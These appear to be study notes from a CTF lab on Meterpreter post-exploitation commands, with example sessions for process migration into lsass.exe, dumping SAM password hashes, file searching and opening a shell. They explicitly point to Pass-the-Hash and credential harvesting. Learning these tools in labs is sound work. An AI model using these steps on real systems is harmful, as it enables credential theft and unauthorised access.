Meterpreter Practical Commands

## Summary
This document provides practical notes and examples for common **Meterpreter commands** used during the **post-exploitation phase** of penetration testing. These notes summarize key functionalities, command usage, and practical implications for future reference and learning.

## Key Commands and Usage

### 1. Help Command
The `help` command lists all available Meterpreter commands for the current session.
```
meterpreter > help
```
Each Meterpreter version may include slightly different commands. Always use `help` to view the currently available set.

---

### 2. Getuid Command
Displays the user that Meterpreter is currently running as, helping identify privilege levels (e.g., SYSTEM or regular user).
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
This information determines whether you have administrative rights or need privilege escalation.

---

### 3. Ps Command
Lists all running processes on the target system. The **PID** column identifies process IDs used in migration.
```
meterpreter > ps
```
Example output:
```
 PID   PPID  Name          Arch  User
 ---   ----  ----          ----  ----
 716   596   lsass.exe     x64   NT AUTHORITY\SYSTEM
 1304  692   spoolsv.exe   x64   NT AUTHORITY\SYSTEM
 1276  1304  cmd.exe       x64   NT AUTHORITY\SYSTEM
```
This allows you to identify which processes to migrate into or monitor.

---

### 4. Migrate Command
Allows Meterpreter to move into another process, enhancing stability or gaining new privileges.
```
meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
```
> ⚠️ **Caution:** Migrating from a SYSTEM process to a lower-privileged one may reduce access rights permanently.

---

### 5. Hashdump Command
Dumps password hashes stored in the Windows SAM (Security Account Manager) database.
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
These NTLM hashes can be used for **Pass-the-Hash** attacks or cracked using rainbow tables or online databases.

---

### 6. Search Command
Used to locate specific files within the target system.
```
meterpreter > search -f flag2.txt
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)
```
This is valuable for **CTFs** or finding sensitive information (e.g., credentials, configuration files).

---

### 7. Shell Command
Opens a native command-line shell on the target system.
```
meterpreter > shell
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```
Press **CTRL+Z** to return to the Meterpreter session.

---

## Notes
- Always check privileges with `getuid` before performing sensitive actions.
- Use `migrate` strategically for persistence or better process control.
- Commands like `hashdump` and `search` are key for credential harvesting and data discovery.
- Exiting the shell with `CTRL+Z` returns control to Meterpreter safely.
